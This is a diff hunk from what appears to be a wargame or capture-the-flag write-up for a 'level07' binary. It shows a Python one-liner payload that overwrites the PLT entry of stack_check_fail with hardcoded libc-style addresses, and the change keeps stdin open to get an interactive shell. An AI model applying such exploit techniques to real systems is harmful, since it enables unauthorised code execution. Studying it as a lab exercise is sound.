@@ -23,5 +23,5 @@ The data we want to store using "store" needs to be put at an index that will be
 To do so we can override the address of the plt of a function -> stack_check_fail : 0x804a010
 
 ```
-python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "store" + "\n" + <address of command buffer + 7> + "\n" + <index diff between start of data[100] and 0x804a010> '
+(python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "store" + "\n" + <address of command buffer + 7> + "\n" + <index diff between start of data[100] and 0x804a010>' ; cat) | ./level07
 ```
